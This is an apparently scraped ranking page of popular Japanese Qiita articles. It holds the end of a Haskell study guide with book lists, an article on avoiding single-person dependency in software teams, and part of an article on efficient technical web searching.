<span id="haskellもくもく会" class="fragment"></span><a href="#haskell%E3%82%82%E3%81%8F%E3%82%82%E3%81%8F%E4%BC%9A"><i class="fa fa-link"></i></a>Haskellもくもく会</h2>

<p>Haskell-jp主催で<a href="https://haskellmokumoku.connpass.com/" rel="nofollow noopener" target="_blank">Haskellのもくもく会</a>が毎月開催されている。<br>
初心者も歓迎されるので奮ってご参加を！</p>

<h1>
<span id="困ったときには" class="fragment"></span><a href="#%E5%9B%B0%E3%81%A3%E3%81%9F%E3%81%A8%E3%81%8D%E3%81%AB%E3%81%AF"><i class="fa fa-link"></i></a>困ったときには</h1>

<ol>
<li>ググってみる。</li>
<li>
<a href="http://dev.stephendiehl.com/hask/" rel="nofollow noopener" target="_blank">WHAT I WISH I KNEW WHEN LEARNING HASKELL</a>に書いてないか確認する。<sup id="fnref10"><a href="#fn10" rel="footnote" title="一応日本語版もあるが古い上に不完全である。">10</a></sup>
</li>
<li>Haskell-jpのSlackで聞いてみる。<sup id="fnref11"><a href="#fn11" rel="footnote" title="強そうな質問で溢れており気後れするのも分かるが、初心者の質問も大歓迎される。">11</a></sup>
</li>
</ol>

<p>TwitterでHaskellerをフォローして仲良くなると困ったときに助けてくれる。</p>

<h1>
<span id="アドバイス" class="fragment"></span><a href="#%E3%82%A2%E3%83%89%E3%83%90%E3%82%A4%E3%82%B9"><i class="fa fa-link"></i></a>アドバイス</h1>

<ol>
<li>すごいH本やHaskell入門は何回も読み返す。</li>
<li>エラーメッセージは友と思う。めげない。</li>
<li>英語を忌避しない。</li>
<li>日本語でググってないときは英語でググるとすぐ出てくる。</li>
<li>わからないことはすぐ質問する。</li>
<li>論文を忌避しない。<sup id="fnref12"><a href="#fn12" rel="footnote" title="そこらのネットの記事の100億倍わかりやすいのが論文である。型システム入門を読んでおけばまず理解できるはずだ。">12</a></sup>
</li>
<li>演算子や関数がなにかわからないときはHoogleやHayoo!で検索してみる。<sup id="fnref13"><a href="#fn13" rel="footnote" title="hgrksという言葉があるとかないとか。Hayoo!の方はほとんどすべてのパッケージが検索できるとか。">13</a></sup>
</li>
<li>圏論の基礎とか型システム入門は辞書的な使い方でも有用なので買っとけ<sup id="fnref14"><a href="#fn14" rel="footnote" title="正直とりあえずで買える値段ではない。">14</a></sup>
</li>
</ol>

<h1>
<span id="結論" class="fragment"></span><a href="#%E7%B5%90%E8%AB%96"><i class="fa fa-link"></i></a>結論</h1>

<p>すごいH本とHaskell入門を買って手を動かしながら読み、わからないところをHaskell-jpのSlackで質問すれば中級者にはなれる。</p>

<h1>
<span id="この記事で出てきた本-記事の一覧" class="fragment"></span><a href="#%E3%81%93%E3%81%AE%E8%A8%98%E4%BA%8B%E3%81%A7%E5%87%BA%E3%81%A6%E3%81%8D%E3%81%9F%E6%9C%AC-%E8%A8%98%E4%BA%8B%E3%81%AE%E4%B8%80%E8%A6%A7"><i class="fa fa-link"></i></a>この記事で出てきた本, 記事の一覧</h1>

<ul>
<li><a href="https://qiita.com/igrep/items/da1d8df6d40eb001a561">Stackでやる最速Haskell Hello world! (GHCのインストール付き！)</a></li>
<li><a href="http://amzn.asia/cjNcHXP" rel="nofollow noopener" target="_blank">Haskell 教養としての関数型プログラミング</a></li>
<li><a href="http://amzn.asia/dZIoGJ7" rel="nofollow noopener" target="_blank">Haskell入門</a></li>
<li><a href="https://www.ncaq.net/2017/10/07/" rel="nofollow noopener" target="_blank">2017-10-07
Haskellを書くときはstylish-haskellとhlintを使って労せずして綺麗なコードを書きましょう</a></li>
<li><a href="http://amzn.asia/2RhgBDl" rel="nofollow noopener" target="_blank">すごいHaskellたのしく学ぼう！</a></li>
<li><a href="http://amzn.asia/d4uxed3" rel="nofollow noopener" target="_blank">Haskellによる関数プログラミングの思考法</a></li>
<li><a href="http://www.geocities.jp/m_hiroi/func/haskell32.html" rel="nofollow noopener" target="_blank">お気楽Haskellプログラミング入門</a></li>
<li><a href="http://dev.stephendiehl.com/hask/" rel="nofollow noopener" target="_blank">WHAT I WISH I KNEW WHEN LEARNING HASKELL</a></li>
<li><a href="http://amzn.asia/3VgbyYr" rel="nofollow noopener" target="_blank">Haskellによる並列・並行プログラミング</a></li>
<li><a href="https://qiita.com/7shi/items/4408b76624067c17e933">Haskell モナド変換子超入門</a></li>
<li><a href="http://amzn.asia/fMnNyyE" rel="nofollow noopener" target="_blank">関数プログラミング実践入門</a></li>
<li><a href="http://amzn.asia/hFHLLoy" rel="nofollow noopener" target="_blank">純粋関数型データ構造</a></li>
<li><a href="http://amzn.asia/6N5w9B5" rel="nofollow noopener" target="_blank">関数プログラミング 珠玉のアルゴリズムデザイン</a></li>
<li><a href="https://qiita.com/hiruberuto/items/8bbc0343bf794c368287">モナドはポケモン。数学が出てこないモナド入門</a></li>
<li><a href="http://fumieval.hatenablog.com/entry/2013/05/09/223604#f2" rel="nofollow noopener" target="_blank">Freeモナドを超えた!?operationalモナドを使ってみよう</a></li>
<li><a href="https://hackage.haskell.org/package/mmorph-1.1.0/docs/Control-Monad-Morph.html" rel="nofollow noopener" target="_blank">Control.Monad.MMorph</a></li>
<li><a href="https://qiita.com/hiratara/items/65fcf38070def7e5a918">モナドモナド (LT没ネタ)</a></li>
<li><a href="http://konn-san.com/prog/haskell/extensible-effects.html" rel="nofollow noopener" target="_blank">Extensible Effects はモナド変換子に対する救世主になり得るか?</a></li>
<li><a href="http://web.cs.ucla.edu/%7Epalsberg/tba/papers/nielson-nielson-csd99.pdf" rel="nofollow noopener" target="_blank">Type and Effect system</a></li>
<li><a href="http://amzn.asia/6Q1Gd9x" rel="nofollow noopener" target="_blank">型システム入門</a></li>
<li><a href="http://amzn.asia/dbMhj4K" rel="nofollow noopener" target="_blank">プログラム意味論</a></li>
<li><a href="http://the.igreque.info/posts/2015-06-09-lens-prism.html" rel="nofollow noopener" target="_blank">Lens&amp;Prism勉強会 私的まとめ</a></li>
<li><a href="http://amzn.asia/hmEqpbh" rel="nofollow noopener" target="_blank">圏論 原著</a></li>
<li><a href="http://amzn.asia/0tPSJci" rel="nofollow noopener" target="_blank">圏論の基礎</a></li>
<li><a href="https://sites.google.com/site/klovelab/Home/category" rel="nofollow noopener" target="_blank">圏論.hs</a></li>
<li><a href="http://tune.hateblo.jp/entry/2015/03/27/035648" rel="nofollow noopener" target="_blank">Haskellオブジェクト指向に触れてみよう〜初級編〜</a></li>
<li><a href="https://fumieval.github.io/papers/ja/2015-Haskell-objects.pdf" rel="nofollow noopener" target="_blank">Haskellでの合成可能なオブジェクトの構成とその応用</a></li>
<li><a href="https://dodgsonlabs.booth.pm/items/490689" rel="nofollow noopener" target="_blank">入門LiquidHaskell−篩型による静的コード解析−</a></li>
<li><a href="https://haskell.jp/" rel="nofollow noopener" target="_blank">Haskell-jp</a></li>
</ul>

<div class="footnotes">
<hr>
<ol>

<li id="fn1">
<p>私はいずれは知るべきだと考えているが、すくなくともこの段階で知るべきことではない。 <a href="#fnref1">↩</a></p>
</li>

<li id="fn2">
<p>残念ながらHaskellで書かれていない. <a href="#fnref2">↩</a></p>
</li>

<li id="fn3">
<p>多分紹介する。多分 <a href="#fnref3">↩</a></p>
</li>

<li id="fn4">
<p>困ったことに書きかけだが。 <a href="#fnref4">↩</a></p>
</li>

<li id="fn5">
<p>圏論による形式化の論文があった気がするのだが見つからない。 <a href="#fnref5">↩</a></p>
</li>

<li id="fn6">
<p>困ったことにTemplate Haskellも使えなくなる。 <a href="#fnref6">↩</a></p>
</li>

<li id="fn7">
<p>Haskell++とかO'Haskellとかもあるけども…… <a href="#fnref7">↩</a></p>
</li>

<li id="fn8">
<p><a href="https://dodgsonlabs.booth.pm/items/490689" rel="nofollow noopener" target="_blank">入門LiquidHaskell−篩型による静的コード解析−</a>はLiquidHaskellに関する唯一(?)の本。 <a href="#fnref8">↩</a></p>
</li>

<li id="fn9">
<p>ここらへんに関しては目下勉強中なもんで。 <a href="#fnref9">↩</a></p>
</li>

<li id="fn10">
<p>一応<a href="https://github.com/shiatsumat/wiwinwlh-jp/wiki" rel="nofollow noopener" target="_blank">日本語版</a>もあるが古い上に不完全である。 <a href="#fnref10">↩</a></p>
</li>

<li id="fn11">
<p>強そうな質問で溢れており気後れするのも分かるが、初心者の質問も大歓迎される。 <a href="#fnref11">↩</a></p>
</li>

<li id="fn12">
<p>そこらのネットの記事の100億倍わかりやすいのが論文である。型システム入門を読んでおけばまず理解できるはずだ。 <a href="#fnref12">↩</a></p>
</li>

<li id="fn13">
<p>hgrksという言葉があるとかないとか。Hayoo!の方はほとんどすべてのパッケージが検索できるとか。 <a href="#fnref13">↩</a></p>
</li>

<li id="fn14">
<p>正直とりあえずで買える値段ではない。 <a href="#fnref14">↩</a></p>
</li>

</ol>
</div>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">49位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>199</kbd>
		<a target="_blank" href="https://qiita.com/4kizuki/items/9eddae1205dc00e9dccc">属人化を避ける</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-10-21<br />11:16:45</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/191398.html">4kizuki</a>(5件の記事)<br><img width="80" height="80" src="https://avatars3.githubusercontent.com/u/23712113?v=3">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[GitHub]</b> <b>[プログラミング]</b> <b>[環境構築]</b> <b>[プログラミング教育]</b> <b>[新人プログラマ応援]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p>このQiitaは、マサカリや編集リクエスト歓迎です</p>

<h1>
<span id="属人化って" class="fragment"></span><a href="#%E5%B1%9E%E4%BA%BA%E5%8C%96%E3%81%A3%E3%81%A6"><i class="fa fa-link"></i></a>属人化って？</h1>

<p>「○○さんがいないとプロジェクトが進まない！」という状況</p>

<p>例えば…</p>

<ul>
<li>ある手続きについて、マニュアルがない、仕様書もない</li>
<li>マニュアルなしで操作できるのが○○さん一人</li>
</ul>

<p>より強い表現をすれば、○○さんが任意にプロジェクトの進行を止められる状態</p>

<h1>
<span id="用語" class="fragment"></span><a href="#%E7%94%A8%E8%AA%9E"><i class="fa fa-link"></i></a>用語</h1>

<table>
<thead>
<tr>
<th>用語</th>
<th>説明</th>
</tr>
</thead>
<tbody>
<tr>
<td>プロジェクト</td>
<td>チーム全体で進めるもの</td>
</tr>
<tr>
<td>タスク</td>
<td>個人またはチームの一部で進めるもの</td>
</tr>
<tr>
<td>モジュール</td>
<td>プロジェクトの断片で、タスクは基本的にモジュールを作る</td>
</tr>
</tbody>
</table>

<h1>
<span id="属人化の理由" class="fragment"></span><a href="#%E5%B1%9E%E4%BA%BA%E5%8C%96%E3%81%AE%E7%90%86%E7%94%B1"><i class="fa fa-link"></i></a>属人化の理由</h1>

<h2>
<span id="個人の問題" class="fragment"></span><a href="#%E5%80%8B%E4%BA%BA%E3%81%AE%E5%95%8F%E9%A1%8C"><i class="fa fa-link"></i></a>個人の問題</h2>

<ul>
<li>手抜きやバグを隠す<br>
たとえば、仕様書外の動作を実装し、それをプロジェクトで利用する</li>
<li>解雇されないための保険的行動</li>
</ul>

<h2>
<span id="チームの問題" class="fragment"></span><a href="#%E3%83%81%E3%83%BC%E3%83%A0%E3%81%AE%E5%95%8F%E9%A1%8C"><i class="fa fa-link"></i></a>チームの問題</h2>

<ul>
<li>マニュアルを作る文化の欠如</li>
<li>他人のタスクに対する無関心</li>
<li>他人の監査なしにプロジェクトを更新可能</li>
</ul>

<h1>
<span id="どうやって属人化を避けるのか" class="fragment"></span><a href="#%E3%81%A9%E3%81%86%E3%82%84%E3%81%A3%E3%81%A6%E5%B1%9E%E4%BA%BA%E5%8C%96%E3%82%92%E9%81%BF%E3%81%91%E3%82%8B%E3%81%AE%E3%81%8B"><i class="fa fa-link"></i></a>どうやって属人化を避けるのか</h1>

<h2>
<span id="間違った対策" class="fragment"></span><a href="#%E9%96%93%E9%81%95%E3%81%A3%E3%81%9F%E5%AF%BE%E7%AD%96"><i class="fa fa-link"></i></a>間違った対策</h2>

<ul>
<li>○○さん以外にもマニュアルなしで操作できる人間を育成

<ul>
<li>育成した人が全滅すればやっぱり同じ状況</li>
<li>全員がすべてのプロジェクトに精通するとかはムリ</li>
</ul>
</li>
</ul>

<h2>
<span id="正しい対策" class="fragment"></span><a href="#%E6%AD%A3%E3%81%97%E3%81%84%E5%AF%BE%E7%AD%96"><i class="fa fa-link"></i></a>正しい対策</h2>

<ul>
<li>モジュールごとに仕様書を用意</li>
<li>間違って使うことが難しい仕様とする

<ul>
<li>即ち、仕様書を読まなくてもある程度正確に使える</li>
</ul>
</li>
<li>お互いにコードレビューさせる</li>
</ul>

<h2>
<span id="具体的にはどうすれば良い" class="fragment"></span><a href="#%E5%85%B7%E4%BD%93%E7%9A%84%E3%81%AB%E3%81%AF%E3%81%A9%E3%81%86%E3%81%99%E3%82%8C%E3%81%B0%E8%89%AF%E3%81%84"><i class="fa fa-link"></i></a>具体的にはどうすれば良い？</h2>

<h3>
<span id="テスト仕様書利用例" class="fragment"></span><a href="#%E3%83%86%E3%82%B9%E3%83%88%E4%BB%95%E6%A7%98%E6%9B%B8%E5%88%A9%E7%94%A8%E4%BE%8B"><i class="fa fa-link"></i></a>テスト・仕様書・利用例</h3>

<ul>
<li>テストは仕様書のベースとなる</li>
<li>仕様書を見れば、深い動作がわかるようになる</li>
<li>仕様書を読まなくても、利用例を見れば使える</li>
</ul>

<h3>
<span id="全員がテストできる環境を作る" class="fragment"></span><a href="#%E5%85%A8%E5%93%A1%E3%81%8C%E3%83%86%E3%82%B9%E3%83%88%E3%81%A7%E3%81%8D%E3%82%8B%E7%92%B0%E5%A2%83%E3%82%92%E4%BD%9C%E3%82%8B"><i class="fa fa-link"></i></a>全員がテストできる環境を作る</h3>

<ul>
<li>前提条件の少ないテスト

<ul>
<li>たとえば、「テストしようと思ったら、DBが初期化されてなくてテストできなかった！」を避ける</li>
<li>この時、「データベースくらい自分で初期化しろ！」ではなく、テスト内で自動的にDBやテーブルを生成させるようにする</li>
<li>一般に、テストは単体テストであるように作ること(依存性や、環境の前提条件が可能な限り少ない) (2017/10/23追記)</li>
</ul>
</li>
</ul>

<p>　</p>

<ul>
<li>モジュール化

<ul>
<li>モジュール単位でリポジトリが存在し、モジュール単位でテストが可能</li>
<li>プロジェクトの<code>Issue</code>や<code>Pull Requests</code>が混雑しなくなる</li>
<li>気楽に問題を報告できるし、問題の原因がどこにあるかを特定しやすい</li>
</ul>
</li>
</ul>

<h3>
<span id="相互にチェックしあう体制" class="fragment"></span><a href="#%E7%9B%B8%E4%BA%92%E3%81%AB%E3%83%81%E3%82%A7%E3%83%83%E3%82%AF%E3%81%97%E3%81%82%E3%81%86%E4%BD%93%E5%88%B6"><i class="fa fa-link"></i></a>相互にチェックしあう体制</h3>

<ul>
<li>コードレビューのルーチンワーク化

<ul>
<li>あるモジュールをレビューする人が複数存在する環境</li>
</ul>
</li>
<li>プロジェクトやモジュールの<code>master</code>ブランチへのアクセス権を限定し、マージの際に品質チェックが入るようにする</li>
<li>このタイミングで、仕様書外の動作を弾くことができる (2017/10/23追記)</li>
</ul>

<h1>
<span id="やってはいけないこと" class="fragment"></span><a href="#%E3%82%84%E3%81%A3%E3%81%A6%E3%81%AF%E3%81%84%E3%81%91%E3%81%AA%E3%81%84%E3%81%93%E3%81%A8"><i class="fa fa-link"></i></a>やってはいけないこと</h1>

<ul>
<li>仕様書やマニュアルの<strong>確定</strong>

<ul>
<li>これらもしっかりとVCSで管理し、問題点を共有</li>
<li>コロコロ変わる仕様書はダメだが、全く変わらない仕様書は負の遺産を生みだす</li>
<li>仕様書も、悪いと思ったら悪いといえるようにしよう</li>
</ul>
</li>
</ul>

<p>　</p>

<ul>
<li>仕様書が大量に存在 (読むのが大変)

<ul>
<li>間違って使うことが難しいようにする</li>
<li>モジュール間でインターフェースを統一</li>
<li>利用例を充実させる</li>
</ul>
</li>
</ul>

<p>　</p>

<ul>
<li>プロを使わない

<ul>
<li>すなわち、「<strong>質問するな、調べろ</strong>」が徹底されてしまうのはよくない</li>
<li>属人化の排除を行う目的は、「<strong>誰でも、ある程度の短時間で理解ができる</strong>」状況を作ること</li>
<li>ある程度調べて分からなければ、やはりその道のプロに聞くべき</li>
</ul>
</li>
</ul>

<h1>
<span id="こっちも読んでね" class="fragment"></span><a href="#%E3%81%93%E3%81%A3%E3%81%A1%E3%82%82%E8%AA%AD%E3%82%93%E3%81%A7%E3%81%AD"><i class="fa fa-link"></i></a>こっちも読んでね</h1>

<p><a href="https://qiita.com/4kizuki/items/3b60443ccd473d192c21" id="reference-40bd590782e0690eb69b">続・属人化を避ける</a></p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">50位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>198</kbd>
		<a target="_blank" href="https://qiita.com/yoichiwo7/items/9a38ef1c5ab41b163cf1">IT関連技術を効率的に検索する</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-09-30<br />17:00:59</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/174502.html">yoichiwo7</a>(6件の記事)<br><img width="80" height="80" src="https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=50">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[GitHub]</b> <b>[google]</b> <b>[効率化]</b> <b>[検索]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p>プログラミングやIT関連技術に関する情報を、以下のようなものを組み合わせて効率よく検索する検索方法を紹介します。</p>

<ul>
<li>Stack Overflow</li>
<li>Slideshare</li>
<li>画像検索</li>
<li>Githubのawesomeレポジトリ</li>
</ul>

<h1>
<span id="背景" class="fragment"></span><a href="#%E8%83%8C%E6%99%AF"><i class="fa fa-link"></i></a>背景</h1>

<p>近年のOSSを積極的に活用した開発では、常に新しい技術や概念が登場します。全てを取り入れることはありませんが、顧客や社内の色々な事情により、こういった技術を調査して必要に応じて取り込んでいくことが以前よりも多くなっていると思います。このため開発者は以下のような状況に置かれることが多くなりました。</p>

<ul>
<li>同じプログラミング言語、ライブラリを使い続けることができない</li>
<li>分かりやすい書籍、研修が存在しない</li>
<li>取り組むべき技術について詳しい人が回りにいない</li>
</ul>

<p>しかしこのような状況に陥ったとしても、新しく取り組む技術について素早く把握する必要がありますし、開発においても慣れいないプログラミング言語やライブラリであっても停滞する時間を少しでも短くする必要があります。これを実現するためには分厚い書籍、時間のかかる研修などを頼るのは難しいです。そもそも書籍や研修自体が存在しない場合もあります。</p>

<p>そこでWeb上の情報に頼ることになります。調査の際には対象技術を効率よく検索して概観をつかみ、開発の際には周りに詳しい人がいなくても全世界の開発者の知恵やノウハウをうまく活用してスケジュール内にものが出来上がるようにします。私もそのようにして新しい技術を調査したり、それをもとに開発を行ったりしてきました。しかし私の周りを見てみると、意外とそういった検索ができない人が多いみたいです。Google検索が一般化しているため検索をするという操作はできるのですが、効率的な検索や適切な検索ができないようです。このためある技術について調査をしてもらっても、以下のような状態になってなかなかアウトプットが出てきません。</p>

<ul>
<li>対象技術の概要、利点、欠点を調べるために、公式サイトを当てもなく探す。(そして何故かAPI仕様に迷い込む)</li>
<li>プログラミングでやりたいこと、エラー解決方法をYahoo知恵袋やteratailで調べて見つからない。</li>
<li>ブラウザ上に対象技術のWebページタブが数十個並び、いつまでも閉じらることがない。</li>
</ul>

<p>このような状況に陥らないためにも、IT技術者としての検索方法はある程度レパートリーとして整理する必要があると思い、この記事を作成しました。</p>

<h1>
<span id="効率的な検索方法" class="fragment"></span><a href="#%E5%8A%B9%E7%8E%87%E7%9A%84%E3%81%AA%E6%A4%9C%E7%B4%A2%E6%96%B9%E6%B3%95"><i class="fa fa-link"></i></a>効率的な検索方法</h1>

<p>基本的にここで紹介する検索方法は、全てGoogle検索を前提としています。<br>
また検索結果に英語の情報が出てくるため、簡単な技術英語が読めることも前提としています。</p>

<h2>
<span id="定型キーワードを組み合わせる-目的をもった検索" class="fragment"></span><a href="#%E5%AE%9A%E5%9E%8B%E3%82%AD%E3%83%BC%E3%83%AF%E3%83%BC%E3%83%89%E3%82%92%E7%B5%84%E3%81%BF%E5%90%88%E3%82%8F%E3%81%9B%E3%82%8B-%E7%9B%AE%E7%9A%84%E3%82%92%E3%82%82%E3%81%A3%E3%81%9F%E6%A4%9C%E7%B4%A2"><i class="fa fa-link"></i></a>定型キーワードを組み合わせる (目的をもった検索)</h2>

<p>気になるプログラミング言語、フレームワーク、ライブラリ等のトピックに関する一般的な事柄（概要、採用利用、利点、欠点など）を検索したい場合は <code>対象トピック + 定型キーワード</code> の組み合わせでて検索をします。以下に私が使用する定型キーワードを紹介します。自分の目的に応じてレパートリーを増やしてみてください。</p>

<table>
<thead>
<tr>
<th>日本語</th>
<th>英語</th>
</tr>
</thead>
<tbody>
<tr>
<td>概要</td>
<td>overview, introduction, in minutes, TLDR</td>
</tr>
<tr>
<td>採用する利用</td>
<td>why, swtiched to, choose</td>
</tr>
<tr>
<td>利点</td>
<td>pros, benefits, rocks</td>
</tr>
<tr>
<td>欠点</td>
<td>cons, problems, sucks</td>
</tr>
<tr>
<td>2017年時点のトレンド</td>
<td>in 2017, 2017 trend</td>
</tr>
</tbody>
</table>

<p>例えば、WebフロントエンドのVue.jsについて採用する理由について調べたい場合は <code>Vue.js why</code> や <code>Vue.js choose</code> と検索することにより効率よく検索できます。</p>

<h2>
<span id="stack-overflowを活用する-やりたいことトラブル解決" class="fragment"></span><a href="#stack-overflow%E3%82%92%E6%B4%BB%E7%94%A8%E3%81%99%E3%82%8B-%E3%82%84%E3%82%8A%E3%81%9F%E3%81%84%E3%81%93%E3%81%A8%E3%83%88%E3%83%A9%E3%83%96%E3%83%AB%E8%A7%A3%E6%B1%BA"><i class="fa fa-link"></i></a>Stack Overflowを活用する (やりたいこと、トラブル解決)</h2>

<p>プログラミング等で何かをしたい時には <code>検索したい事柄 + StackOverflow</code> と検索します。</p>

<ul>
<li>何かをやる方法</li>
<li>特定のエラーメッセージが出た時の原因、対処方法</li>
</ul>

<p>StackOverfolowはプログラミング関連の質問＆回答サイトです。日本ではYaboo知恵袋、teratail等がありますが、蓄積されている情報量および質が比較にならないため積極的に活用しましょう。なお評価数の多い回答(ベストアンサーに相当)が最初に羅列されるため、有用な回答がすぐに見ることができます。</p>

<p>以下に検索例を示します。</p>

<ul>
<li>PythonでIPアドレスをバリデーションしたい ⇒ <code>Python IP validation Stackoverflow</code>
</li>
<li>PythonのNumpyを使用しようとすると "Import Error: No module named numpy" が発生する原因を知りたい ⇒ <code>python numpy Import Error "No module named numpy" Stackoverflow</code>
</li>
</ul>

<p>補足になりますが、Google検索では <code>Python IP 妥当性 Stackoverflow</code> のように日本語キーワードを含めた場合でも、ある程度は自動的に単語を英訳して検索をするようになっているようです。このため英語のキーワードが分からない場合でも適切なStack Overflowの回答ページを見つけることができる場合が多いです。</p>

<h2>
<span id="slideshareを活用する-概観をつかむ" class="fragment"></span><a href="#slideshare%E3%82%92%E6%B4%BB%E7%94%A8%E3%81%99%E3%82%8B-%E6%A6%82%E8%A6%B3%E3%82%92%E3%81%A4%E3%81%8B%E3%82%80"><i class="fa fa-link"></i></a>SlideShareを活用する (概観をつかむ)</h2>

<p>PowerPointのようなスライド形式資料で技術の概要・外観をつかみたい時には <code>検索したい技術 + SlideShare</code> と検索します。</p>

<p>SlideShareはプログラミング等を中心としたIT技術関連のスライド資料を公開、観閲できるサイトです。スライド資料は分かりやすさを重視するために箇条書きやイメージを活用しているため、馴染みのない技術の概観をつかむのに適しています。</p>

<h2>
<span id="google画像検索を活用する-検索結果を視覚的にザッピング" class="fragment"></span><a href="#google%E7%94%BB%E5%83%8F%E6%A4%9C%E7%B4%A2%E3%82%92%E6%B4%BB%E7%94%A8%E3%81%99%E3%82%8B-%E6%A4%9C%E7%B4%A2%E7%B5%90%E6%9E%9C%E3%82%92%E8%A6%96%E8%A6%9A%E7%9A%84%E3%81%AB%E3%82%B6%E3%83%83%E3%83%94%E3%83%B3%E3%82%B0"><i class="fa fa-link"></i></a>Google画像検索を活用する (検索結果を視覚的にザッピング)</h2>

<p>Google画像検索で <code>検索対象トピック + overview</code> 等と検索することにより、その検索対象トピックのイメージを視覚的に眺めることができます。通常の検索とは異なり、複数の検索結果の画像として同時に見ることができるため「ザッピングして、気になった画像があればそのWebページを開く」という効率のよい検索フローを実現することができます。</p>

<p>一般的に有用な画像、分かりやすい画像を掲載しているWebページは時間をかけて作成しており、質の高いものが多い傾向にあります。質の高いWebページを見つけるためのお供にGoogle画像検索を活用しましょう。</p>

<p>以下にGoogle画像の検索例を示します。</p>

<ul>
<li>Node.jsのアーキテクチャ構成を知りたい ⇒ <code>Node.js overview</code>
</li>
<li>Node.jsの性能比較を知りたい ⇒ <code>Node.js peformance comparison</code>
</li>
</ul>

<h2>
<span id="githubのawesome系レポジトリを活用する-お勧め人気を把握" class="fragment"></span><a href="#github%E3%81%AEawesome%E7%B3%BB%E3%83%AC%E3%83%9D%E3%82%B8%E3%83%88%E3%83%AA%E3%82%92%E6%B4%BB%E7%94%A8%E3%81%99%E3%82%8B-%E3%81%8A%E5%8B%A7%E3%82%81%E4%BA%BA%E6%B0%97%E3%82%92%E6%8A%8A%E6%8F%A1"><i class="fa fa-link"></i></a>Githubのawesome系レポジトリを活用する (お勧め・人気を把握)</h2>

<p>あるプログラミング言語の各分野の人気ライブラリ、フレームワーク、推奨Webページなどを把握したい場合、Githubでawesome系のレポジトリを検索します。<br>
awesome系レポジトリは各プログラミング言語やフレームワークに関して、その分野に携わる人達が人気・お勧めのものライブラリやフレームワークのリストを作成、メンテナンスしているレポジトリです。</p>

<p>例えば、Pythonの各分野の人気ライブラリ、フレームワークを調べたい場合は <code>github awesome python</code> と検索すればawesome-pythonをいくつか見つけることができます。基本的にGithubのスター数が多いものが一番アクティブにメンテナンスされているため、スター数が多いものを優先しましょう。ちなみに人気の高いライブラリ、フレームワーク、プロトコル等については、それ用のawesome-xxxレポジトリが存在します。</p>

<table>
<thead>
<tr>
<th>分野</th>
<th>レポジトリ名称の例</th>
</tr>
</thead>
<tbody>
<tr>
<td>プログラミング言語関連</td>
<td>awesome-python, awesome-java</td>
</tr>
<tr>
<td>フレームワーク,ライブラリ関連</td>
<td>awesome-rails, awesome-django, awesome-jquery</td>
</tr>
<tr>
<td>プロトコル関連</td>
<td>awesome-mqtt, awesome-rest</td>
</tr>
<tr>
<td>スタイルガイド関連</td>
<td>awesome-styleguides</td>
</tr>
</tbody>
</table>

<h2>
<span id="英語という選択肢を捨てない-情報の量と質を確保" class="fragment"></span><a href="#%E8%8B%B1%E8%AA%9E%E3%81%A8%E3%81%84%E3%81%86%E9%81%B8%E6%8A%9E%E8%82%A2%E3%82%92%E6%8D%A8%E3%81%A6%E3%81%AA%E3%81%84-%E6%83%85%E5%A0%B1%E3%81%AE%E9%87%8F%E3%81%A8%E8%B3%AA%E3%82%92%E7%A2%BA%E4%BF%9D"><i class="fa fa-link"></i></a>英語という選択肢を捨てない (情報の量と質を確保)</h2>

<p>これまで紹介した検索方法で検索を行うと、英語で記載された情報が検索結果として数多く登場します。一般的に英語の記事のほうが数が多く、質の高い情報が多いです。特にIT関連技術の場合はそれが顕著です。英語という選択肢を捨てるだけで、これまでの検索方法による恩恵は半減します。</p>

<p>英語は毎日少しずつ勉強しましょう。ただし机に向かって勉強はせずに、以下のような行動を習慣に組み込みましょう。</p>

<ul>
<li>仕事で技術関連の情報を調べる時に、1日15分は英語のみを読むようにする。</li>
<li>通勤時に歩いている時にDuo3.0を聞く。(これを何十周とくりかえす)</li>
</ul>

<h1>
<span id="おまけ" class="fragment"></span><a href="#%E3%81%8A%E3%81%BE%E3%81%91"><i class="fa fa-link"></i></a>おまけ</h1>

<p>あまり他の検索方法と比較してあまり汎用性がないが、個人的によく使うものを箇条書きしてます。<br>
検索方法で紹介したものも英語力が要求されますが、こちらに箇条書きしているものはより英語力を要求されるので注意してください。</p>

<ul>
<li><p>MediumというサービスのIT関連記事は質が高いものが多いため、Mediumという検索キーワードを組み合わせる。特にWebやモダンな言語の記事が多いです。例えば2017年のJavaScriptフレームワーク事情について知りたいなら <code>Medium JavaScript 2017 framework</code> と検索します。</p></li>
<li>
<p>Quoraという質問＆回答系SNSは、良い意味での意識高い系の回答やアドバイスが多いため、Quoraという検索キーワードを組み合わせます。例えばプログラマの良い習慣について調べたいなら <code>Quora good programmer habit</code> と検索します。Upvodeが多いほど人気のある回答なので、人気回答を中心に読むことをお勧めします。</p>

<ul>
<li>人気の高い回答は箇条書きベースの構成だった回答が多いので、英語が苦手でも比較的読みやすいです。箇条書き部分だけでも読む価値があります。</li>
<li>本当に大事なことは色々な回答者が同じように書いています。「これ前も見た」と思ったら是非メモしましょう。</li>
</ul>
</li>
